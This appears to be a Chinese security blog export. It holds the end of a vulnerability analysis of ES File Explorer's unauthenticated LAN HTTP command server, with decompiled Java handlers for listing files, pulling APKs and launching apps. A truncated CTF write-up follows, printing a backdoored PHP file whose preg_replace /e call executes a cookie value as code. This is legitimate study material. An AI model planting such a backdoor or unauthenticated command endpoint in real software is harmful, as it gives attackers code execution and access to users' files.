<span class="keyword">if</span> (str.equals(<span class="string">"listApps"</span>)) &#123;<span class="comment">//获取软件列表</span></span><br><span class="line">        <span class="keyword">return</span> a(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (str.equals(<span class="string">"listAppsSystem"</span>)) &#123;<span class="comment">//获取系统软件列表</span></span><br><span class="line">        <span class="keyword">return</span> a(<span class="number">1</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (str.equals(<span class="string">"listAppsPhone"</span>)) &#123;<span class="comment">//获取电话软件列表</span></span><br><span class="line">        <span class="keyword">return</span> a(<span class="number">2</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (str.equals(<span class="string">"listAppsSdcard"</span>)) &#123;<span class="comment">//获取安装在SD卡中的软件列表</span></span><br><span class="line">        <span class="keyword">return</span> a(<span class="number">3</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (str.equals(<span class="string">"listAppsAll"</span>)) &#123;<span class="comment">//获取全部APP</span></span><br><span class="line">        <span class="keyword">return</span> a(<span class="number">4</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (str.equals(<span class="string">"getAppThumbnail"</span>)) &#123;<span class="comment">//获取APP缩略图</span></span><br><span class="line">        <span class="keyword">return</span> d((JSONObject)localObject);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (str.equals(<span class="string">"appLaunch"</span>)) &#123;<span class="comment">//启动APP</span></span><br><span class="line">        <span class="keyword">return</span> a((JSONObject)localObject);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (str.equals(<span class="string">"appPull"</span>)) &#123;<span class="comment">//下载APP</span></span><br><span class="line">        <span class="keyword">return</span> c((JSONObject)localObject);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (str.equals(<span class="string">"getDeviceInfo"</span>))<span class="comment">//获取设备信息</span></span><br><span class="line">      &#123;</span><br><span class="line">        paramString1 = b((JSONObject)localObject);</span><br><span class="line">        <span class="keyword">return</span> paramString1;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (JSONException paramString1)</span><br><span class="line">    &#123;</span><br><span class="line">      paramString1.printStackTrace();</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> c.b(<span class="keyword">this</span>, <span class="string">"500 Internal Server Error"</span>, <span class="string">"text/plain"</span>, paramString1.toString());</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  Object localObject = ah.bL(paramString1);</span><br><span class="line">  <span class="keyword">if</span> ((localObject == <span class="keyword">null</span>) || (ah.I((String)localObject) == <span class="number">0</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> (localObject == <span class="keyword">null</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">super</span>.a(paramString1, paramString2, paramProperties1, paramProperties2, paramProperties3);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">super</span>.a((String)localObject, paramString2, paramProperties1, paramProperties2, paramProperties3);</span><br><span class="line">  &#125;</span><br><span class="line">  paramString1 = paramProperties1.getProperty(<span class="string">"range"</span>);</span><br><span class="line">  <span class="keyword">if</span> ((paramString1 != <span class="keyword">null</span>) &amp;&amp; (paramString1.startsWith(<span class="string">"bytes="</span>)))</span><br><span class="line">  &#123;</span><br><span class="line">    paramString2 = paramString1.substring(<span class="string">"bytes="</span>.length());</span><br><span class="line">    <span class="keyword">int</span> i = paramString2.indexOf(<span class="string">'-'</span>);</span><br><span class="line">    paramString1 = paramString2;</span><br><span class="line">    <span class="keyword">if</span> (i &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      paramString1 = paramString2.substring(<span class="number">0</span>, i);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">for</span> (;;)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">      l = Long.parseLong(paramString1);</span><br><span class="line">      <span class="keyword">return</span> a((String)localObject, l, <span class="number">0L</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (NumberFormatException paramString1)</span><br><span class="line">    &#123;</span><br><span class="line">      l = <span class="number">0L</span>;</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">long</span> l = <span class="number">0L</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>由于漏洞应用条件是在同一个局域网下，所以应用在获取完传入的方法【指令】后调用<code>com.estrongs.android.util.af</code>中的bM方法验证URI地址</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">bM</span><span class="params">(String paramString)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i3 = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">if</span> (paramString == <span class="keyword">null</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    String str1 = ad.a();</span><br><span class="line">    <span class="keyword">int</span> i2;</span><br><span class="line">    <span class="keyword">if</span> ((paramString.startsWith(<span class="string">"http://127.0.0.1"</span>)) || (paramString.startsWith(<span class="string">"http://"</span> + str1)))</span><br><span class="line">    &#123;</span><br><span class="line">      i1 = paramString.indexOf(<span class="string">"/"</span>, <span class="number">7</span>);</span><br><span class="line">      str1 = paramString;</span><br><span class="line">      <span class="keyword">if</span> (i1 &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        str1 = paramString.substring(i1);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (!str1.startsWith(<span class="string">"/"</span>)) &#123;</span><br><span class="line">        <span class="keyword">break</span> label116;</span><br><span class="line">      &#125;</span><br><span class="line">      i2 = str1.indexOf(<span class="string">'/'</span>, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>并且同时调用<code>comestrongsandroidutilad</code>中的a方法检测当前环境是否处于WIFI环境下</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">ad</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">a</span><span class="params">()</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    Object localObject = FexApplication.a();</span><br><span class="line">    <span class="keyword">if</span> (b())</span><br><span class="line">    &#123;</span><br><span class="line">      localObject = ((WifiManager)((Context)localObject).getSystemService(<span class="string">"wifi"</span>)).getConnectionInfo();</span><br><span class="line">      <span class="keyword">if</span> ((localObject == <span class="keyword">null</span>) || (((WifiInfo)localObject).getIpAddress() == <span class="number">0</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> o.a();</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">int</span> i = ((WifiInfo)localObject).getIpAddress();</span><br><span class="line">      <span class="keyword">return</span> (i &amp; <span class="number">0xFF</span>) + <span class="string">"."</span> + (i &gt;&gt; <span class="number">8</span> &amp; <span class="number">0xFF</span>) + <span class="string">"."</span> + (i &gt;&gt; <span class="number">16</span> &amp; <span class="number">0xFF</span>) + <span class="string">"."</span> + (i &gt;&gt; <span class="number">24</span> &amp; <span class="number">0xFF</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> o.a();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>当传入的<code>command</code>为<code>listFiles</code>时，会调用b()函数获取文件信息并以Json格式返回，相关代码如下</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> c.<span class="function">b <span class="title">b</span><span class="params">(String paramString)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (ah.I(paramString) == <span class="number">0</span>) &#123;&#125;</span><br><span class="line">  <span class="keyword">for</span> (;;)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">int</span> i;</span><br><span class="line">    <span class="keyword">try</span></span><br><span class="line">    &#123;</span><br><span class="line">      Object localObject = <span class="keyword">new</span> File(paramString).listFiles();</span><br><span class="line">      DateFormat localDateFormat = com.estrongs.android.pop.h.a().K();</span><br><span class="line">      SimpleDateFormat localSimpleDateFormat = <span class="keyword">new</span> SimpleDateFormat(<span class="string">" hh:mm:ss a"</span>);</span><br><span class="line">      paramString = <span class="string">"[\r\n"</span>;</span><br><span class="line">      i = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> (i &lt; localObject.length)</span><br><span class="line">      &#123;</span><br><span class="line">        paramString = paramString + <span class="string">"&#123;"</span>;</span><br><span class="line">        paramString = paramString + <span class="string">"\"name\":\""</span> + localObject.getName() + <span class="string">"\", "</span>;<span class="comment">//文件名</span></span><br><span class="line">        String str = paramString + <span class="string">"\"time\":\""</span> + localDateFormat.format(<span class="keyword">new</span> Date(localObject.lastModified())) + localSimpleDateFormat.format(<span class="keyword">new</span> Date(localObject.lastModified())) + <span class="string">"\", "</span>;<span class="comment">//时间</span></span><br><span class="line">        <span class="keyword">if</span> (!localObject.isDirectory()) &#123;</span><br><span class="line">          <span class="keyword">break</span> label437;</span><br><span class="line">        &#125;</span><br><span class="line">        paramString = <span class="string">"folder"</span>;</span><br><span class="line">        paramString = str + <span class="string">"\"type\":\""</span> + paramString + <span class="string">"\", "</span>;<span class="comment">//文件类型</span></span><br><span class="line">        paramString = paramString + <span class="string">"\"size\":\""</span> + a(localObject.length()) + <span class="string">"\", "</span>;<span class="comment">//大小</span></span><br><span class="line">        <span class="keyword">if</span> (i == localObject.length - <span class="number">1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          paramString = paramString + <span class="string">"&#125;\r\n"</span>;</span><br><span class="line">          <span class="keyword">break</span> label430;</span><br><span class="line">        &#125;</span><br><span class="line">        paramString = paramString + <span class="string">"&#125;, \r\n"</span>;</span><br><span class="line">        <span class="keyword">break</span> label430;</span><br><span class="line">      &#125;</span><br><span class="line">      paramString = paramString + <span class="string">"]"</span>;</span><br><span class="line">      localObject = <span class="keyword">new</span> c.b(<span class="keyword">this</span>, <span class="string">"200 OK"</span>, <span class="string">"text/plain"</span>, a(paramString));</span><br><span class="line">      ((c.b)localObject).a(<span class="string">"Content-Length"</span>, <span class="string">""</span> + paramString.getBytes(<span class="string">"utf-8"</span>).length);</span><br><span class="line">      <span class="keyword">return</span> localObject;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span> (Exception paramString)<span class="comment">//错误处理</span></span><br><span class="line">    &#123;</span><br><span class="line">      paramString.printStackTrace();</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">new</span> c.b(<span class="keyword">this</span>, <span class="string">"500 Internal Server Error"</span>, <span class="string">"text/plain"</span>, paramString.toString());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> c.b(<span class="keyword">this</span>, <span class="string">"400 Bad Request"</span>, <span class="string">"text/plain"</span>, <span class="string">"Not Supported"</span>);</span><br><span class="line">    label430:</span><br><span class="line">    i += <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">    label437:</span><br><span class="line">    paramString = <span class="string">"file"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当获取的<code>command</code>为<code>appLaunch</code>时，会调用a()方法执行APP，运行成功会返回HTTP CODE 200，不存在则返回500并返回<code>not found the package</code>信息</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> c.<span class="function">b <span class="title">a</span><span class="params">(JSONObject paramJSONObject)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">try</span></span><br><span class="line">      &#123;</span><br><span class="line">        paramJSONObject = paramJSONObject.getString(<span class="string">"appPackageName"</span>);</span><br><span class="line">        <span class="keyword">if</span> (paramJSONObject != <span class="keyword">null</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">new</span> Intent();</span><br><span class="line">          paramJSONObject = FexApplication.c().getPackageManager().getLaunchIntentForPackage(paramJSONObject);</span><br><span class="line">          i = <span class="number">0</span>;</span><br><span class="line">          <span class="keyword">if</span> (paramJSONObject != <span class="keyword">null</span>)</span><br><span class="line">          &#123;</span><br><span class="line">            FexApplication.c().startActivity(paramJSONObject);</span><br><span class="line">            paramJSONObject = <span class="string">"&#123;"</span> + <span class="string">"\"result\":\""</span> + i + <span class="string">"\""</span>;</span><br><span class="line">            paramJSONObject = paramJSONObject + <span class="string">"&#125;"</span>;</span><br><span class="line">            c.b localb = <span class="keyword">new</span> c.b(<span class="keyword">this</span>, <span class="string">"200 OK"</span>, <span class="string">"text/plain"</span>, a(paramJSONObject));</span><br><span class="line">            localb.a(<span class="string">"Content-Length"</span>, <span class="string">""</span> + paramJSONObject.getBytes(<span class="string">"utf-8"</span>).length);</span><br><span class="line">            <span class="keyword">return</span> localb;</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">          paramJSONObject = <span class="keyword">new</span> c.b(<span class="keyword">this</span>, <span class="string">"500 Internal Server Error"</span>, <span class="string">"text/plain"</span>, <span class="string">"not found the package "</span> + paramJSONObject);</span><br><span class="line">          <span class="keyword">return</span> paramJSONObject;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">catch</span> (Exception paramJSONObject)</span><br><span class="line">      &#123;</span><br><span class="line">        paramJSONObject.printStackTrace();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> c.b(<span class="keyword">this</span>, <span class="string">"500 Internal Server Error"</span>, <span class="string">"text/plain"</span>, paramJSONObject.toString());</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">int</span> i = -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>当获取到的<code>command</code>为<code>appPull</code>时，会调用C方法下载一个指定文件，如果存在则返回200并且以数据流传输回设备中，否则返回500并回显<code>not found the package</code>，代码如下</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> c.<span class="function">b <span class="title">c</span><span class="params">(JSONObject paramJSONObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">try</span></span><br><span class="line">  &#123;</span><br><span class="line">    Object localObject = paramJSONObject.getString(<span class="string">"appPackageName"</span>);</span><br><span class="line">    <span class="keyword">if</span> (localObject != <span class="keyword">null</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      paramJSONObject = <span class="keyword">new</span> File(FexApplication.c().getPackageManager().getApplicationInfo((String)localObject, <span class="number">0</span>).sourceDir);</span><br><span class="line">      <span class="keyword">if</span> (paramJSONObject.exists())</span><br><span class="line">      &#123;</span><br><span class="line">        localObject = <span class="keyword">new</span> c.b(<span class="keyword">this</span>, <span class="string">"200 OK"</span>, <span class="string">"application/octet-stream"</span>, <span class="keyword">new</span> FileInputStream(paramJSONObject));</span><br><span class="line">        ((c.b)localObject).a(<span class="string">"Content-Length"</span>, <span class="string">""</span> + paramJSONObject.length());</span><br><span class="line">        <span class="keyword">return</span> localObject;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    paramJSONObject = <span class="keyword">new</span> c.b(<span class="keyword">this</span>, <span class="string">"500 Internal Server Error"</span>, <span class="string">"text/plain"</span>, <span class="string">"not found the package "</span> + (String)localObject);</span><br><span class="line">    <span class="keyword">return</span> paramJSONObject;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">catch</span> (Exception paramJSONObject)</span><br><span class="line">  &#123;</span><br><span class="line">    paramJSONObject.printStackTrace();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="keyword">new</span> c.b(<span class="keyword">this</span>, <span class="string">"500 Internal Server Error"</span>, <span class="string">"text/plain"</span>, paramJSONObject.toString());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>当传入的<code>command</code>为<code>listApps</code>、<code>listAppsSystem</code>、<code>listAppsPhone</code>、<code>listAppsSdcard</code>、<code>listAppsAll</code>时，会调用a(int paramInt)方法执行相应功能，a方法代码如下</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> c.<span class="function">b <span class="title">a</span><span class="params">(<span class="keyword">int</span> paramInt)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    Object localObject2;</span><br><span class="line">    PackageInfo localPackageInfo;</span><br><span class="line">    Object localObject3;</span><br><span class="line">    <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">try</span></span><br><span class="line">      &#123;</span><br><span class="line">        Object localObject1 = FexApplication.a().b(<span class="number">8192</span>);</span><br><span class="line">        localObject2 = <span class="keyword">new</span> LinkedList();</span><br><span class="line">        localObject1 = ((List)localObject1).iterator();</span><br><span class="line">        <span class="keyword">if</span> (!((Iterator)localObject1).hasNext()) &#123;</span><br><span class="line">          <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        localPackageInfo = (PackageInfo)((Iterator)localObject1).next();</span><br><span class="line">        localObject3 = localPackageInfo.applicationInfo;</span><br><span class="line">        <span class="keyword">if</span> (paramInt == <span class="number">0</span>)<span class="comment">//传入a的等于0</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> (((((ApplicationInfo)localObject3).flags &amp; <span class="number">0x80</span>) == <span class="number">0</span>) &amp;&amp; ((((ApplicationInfo)localObject3).flags &amp; <span class="number">0x1</span>) != <span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          ((LinkedList)localObject2).add(localPackageInfo);</span><br><span class="line">          <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (paramInt != <span class="number">1</span>) &#123;</span><br><span class="line">          <span class="keyword">break</span> label146;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">catch</span> (Exception localException)</span><br><span class="line">      &#123;</span><br><span class="line">        localException.printStackTrace();</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> c.b(<span class="keyword">this</span>, <span class="string">"500 Internal Server Error"</span>, <span class="string">"text/plain"</span>, localException.toString());</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ((((ApplicationInfo)localObject3).flags &amp; <span class="number">0x1</span>) &gt; <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        ((LinkedList)localObject2).add(localPackageInfo);</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">        label146:</span><br><span class="line">        <span class="keyword">if</span> (paramInt == <span class="number">2</span>)<span class="comment">//传入a的值等于2</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ((((ApplicationInfo)localObject3).flags &amp; <span class="number">0x40000</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            ((LinkedList)localObject2).add(localPackageInfo);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (paramInt == <span class="number">3</span>)<span class="comment">//传入a的值等于3</span></span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">if</span> ((((ApplicationInfo)localObject3).flags &amp; <span class="number">0x40000</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">            ((LinkedList)localObject2).add(localPackageInfo);</span><br><span class="line">          &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (paramInt == <span class="number">4</span>) &#123;<span class="comment">//传入a的等于4</span></span><br><span class="line">          ((LinkedList)localObject2).add(localPackageInfo);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (;;)</span><br><span class="line">    &#123;</span><br><span class="line">      String str;</span><br><span class="line">      <span class="keyword">if</span> (paramInt &lt; ((LinkedList)localObject2).size())</span><br><span class="line">      &#123;</span><br><span class="line">        localPackageInfo = (PackageInfo)((LinkedList)localObject2).get(paramInt);</span><br><span class="line">        localObject3 = <span class="keyword">new</span> File(localPackageInfo.applicationInfo.sourceDir);</span><br><span class="line">        <span class="keyword">if</span> (!((File)localObject3).exists()) &#123;&#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">long</span> l = <span class="number">0L</span>;; l = ((File)localObject3).length())</span><br><span class="line">        &#123;</span><br><span class="line">                                <span class="comment">//回显JSON的字符串进行拼接</span></span><br><span class="line">          str = localException + <span class="string">"&#123;"</span>;</span><br><span class="line">          str = str + <span class="string">"\"packageName\":\""</span> + localPackageInfo.packageName + <span class="string">"\", "</span>;</span><br><span class="line">          str = str + <span class="string">"\"label\":\""</span> + com.estrongs.android.pop.utils.c.a(FexApplication.a().getPackageManager(), localPackageInfo.applicationInfo) + <span class="string">"\", "</span>;</span><br><span class="line">          str = str + <span class="string">"\"version\":\""</span> + localPackageInfo.versionName + <span class="string">"\", "</span>;</span><br><span class="line">          str = str + <span class="string">"\"versionCode\":\""</span> + localPackageInfo.versionCode + <span class="string">"\", "</span>;</span><br><span class="line">          localObject3 = localPackageInfo.applicationInfo.sourceDir;</span><br><span class="line">          str = str + <span class="string">"\"location\":\""</span> + (String)localObject3 + <span class="string">"\", "</span>;</span><br><span class="line">          str = str + <span class="string">"\"size\":\""</span> + l + <span class="string">"\", "</span>;</span><br><span class="line">          str = str + <span class="string">"\"status\":\""</span> + localPackageInfo.applicationInfo.backupAgentName + <span class="string">"\", "</span>;</span><br><span class="line">          str = str + <span class="string">"\"mTime\":\""</span> + localPackageInfo.lastUpdateTime + <span class="string">"\""</span>;</span><br><span class="line">          <span class="keyword">if</span> (paramInt &gt;= ((LinkedList)localObject2).size() - <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br><span class="line">          str = str + <span class="string">"&#125;,\r\n"</span>;</span><br><span class="line">          <span class="keyword">break</span> label760;</span><br><span class="line">        &#125;</span><br><span class="line">        str = str + <span class="string">"&#125;\r\n"</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        str = str + <span class="string">"]"</span>;</span><br><span class="line">        localObject2 = <span class="keyword">new</span> c.b(<span class="keyword">this</span>, <span class="string">"200 OK"</span>, <span class="string">"text/plain"</span>, a(str));</span><br><span class="line">        ((c.b)localObject2).a(<span class="string">"Content-Length"</span>, <span class="string">""</span> + str.getBytes(<span class="string">"utf-8"</span>).length);</span><br><span class="line">        <span class="keyword">return</span> localObject2;</span><br><span class="line">        str = <span class="string">"[\r\n"</span>;</span><br><span class="line">        paramInt = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      label760:</span><br><span class="line">      paramInt += <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>漏洞主要成因是官方没有对文件分享功能的传入功能的传入者进行身份合法性验证，导致可以被任意执行命令，第一次做APP分析，不足之处请多多指出</p>]]></content>
      
      
      <categories>
          
          <category> VulRepro </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CodeReview </tag>
            
            <tag> VulRepro </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一个CTF题</title>
      <link href="/p/2364522992.html"/>
      <url>/p/2364522992.html</url>
      
        <content type="html"><![CDATA[<p>前些日子一打CTF的朋友发了个PHP文件给我，让我帮着看看</p><a id="more"></a><p>evil.php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">下面是被黑客修改过的文件，请下载并将其中可能存在问题的地方进行修复，上传修复后的结果，若修复正确，你将得到Flag。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">$action = $_REQUEST[<span class="string">'action'</span>];</span><br><span class="line"><span class="keyword">if</span> ($action == <span class="string">'php_info'</span>) &#123;</span><br><span class="line">    phpinfo();</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> ($action == <span class="string">'exitmeeting'</span>) &#123;</span><br><span class="line"></span><br><span class="line">    $content = <span class="string">'您已成功退出群!'</span>;</span><br><span class="line">    $data    = <span class="keyword">array</span>(<span class="string">"touser"</span> =&gt; <span class="string">"$openid"</span>, <span class="string">"msgtype"</span> =&gt; <span class="string">"text"</span>, <span class="string">"text"</span> =&gt; <span class="keyword">array</span>(<span class="string">"content"</span> =&gt; <span class="string">"$content"</span>));</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($kfarray)) &#123;</span><br><span class="line">        $data = array_merge($data, $kfarray);</span><br><span class="line">    &#125;</span><br><span class="line">    $msg       = $weObj-&gt;sendCustomMessage($data);</span><br><span class="line">    $sql       = <span class="string">"select meetingid from &#123;$tablepre&#125;membersinfo where uid=:uid"</span>;</span><br><span class="line">    $meetingid = $db-&gt;fetchOneBySql($sql, <span class="keyword">array</span>(<span class="string">":uid"</span> =&gt; $user[<span class="string">'uid'</span>]));</span><br><span class="line">    $sql       = <span class="string">"UPDATE &#123;$tablepre&#125;membersinfo SET meetingid='0' WHERE uid='$user[uid]'"</span>;</span><br><span class="line">    $db-&gt;query($sql, <span class="keyword">array</span>(<span class="string">":uid"</span> =&gt; $user[<span class="string">'uid'</span>]));</span><br><span class="line">    $rdb-&gt;update(<span class="string">'membersinfo'</span>, $user[<span class="string">'uid'</span>], <span class="keyword">array</span>(<span class="string">"meetingid"</span> =&gt; <span class="number">0</span>));</span><br><span class="line">    <span class="keyword">if</span> ($meetingid != <span class="number">0</span>) &#123;</span><br><span class="line">        $sql              = <span class="string">"SELECT users FROM &#123;$tablepre&#125;meeting WHERE id=:id"</span>;</span><br><span class="line">        $meetinginfousers = $db-&gt;fetchOneBySql($sql, <span class="keyword">array</span>(<span class="string">":id"</span> =&gt; $meetingid));</span><br><span class="line">        $userarray        = array_delete_value(explode(<span class="string">','</span>, $meetinginfousers), $user[<span class="string">'uid'</span>]);</span><br><span class="line">        $newusers         = <span class="string">''</span>;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="keyword">empty</span>($userarray)) &#123;</span><br><span class="line">            $newusers = @implode(<span class="string">','</span>, $userarray);</span><br><span class="line">        &#125;</span><br><span class="line">        $sql = <span class="string">"UPDATE &#123;$tablepre&#125;meeting SET users=:users WHERE id=:id"</span>;</span><br><span class="line">        $db-&gt;query($sql, <span class="keyword">array</span>(<span class="string">":users"</span> =&gt; $newusers, <span class="string">":id"</span> =&gt; $meetingid));</span><br><span class="line"></span><br><span class="line">        meetingmenu($meetingid, <span class="string">'exit'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">"\$header = \""</span> . $tpl-&gt;get(<span class="string">"header"</span>, <span class="string">'mobile'</span>) . <span class="string">"\";"</span>);</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">"\$footer = \""</span> . $tpl-&gt;get(<span class="string">"footer"</span>, <span class="string">'mobile'</span>) . <span class="string">"\";"</span>);</span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">"\$tpl-&gt;output(\""</span> . $tpl-&gt;get(<span class="string">'exit'</span>, <span class="string">'mobile'</span>) . <span class="string">"\");"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> ($action == <span class="string">'cookie'</span>) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($_COOKIE <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">        ssetcookie($key, <span class="string">''</span>, time() + <span class="number">315360000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    printarray($_COOKIE);</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> ($action == <span class="string">'register'</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">empty</span>($_COOKIE[<span class="string">'linkurl'</span>])) &#123;</span><br><span class="line">        $openid = @preg_replace(<span class="string">"/linkurl/e"</span>, $_COOKIE[<span class="string">'linkurl'</span>], <span class="string">"Cookie_linkurl"</span>);</span><br><span class="line">        <span class="keyword">if</span> ($openid) &#123;</span><br><span class="line">            header(<span class="string">'Location:'</span> . $_COOKIE[<span class="string">'linkurl'</span>] . <span class="string">'&amp;flag=register&amp;openid='</span> . $openid);<span class="keyword">exit</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            header(<span class="string">'Location:'</span> . $_COOKIE[<span class="string">'linkurl'</span>] . <span class="string">'&amp;flag=register'</span>);<span class="keyword">exit</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        header(<span class="string">'Location:/mob.php?openid=1'</span>);<span 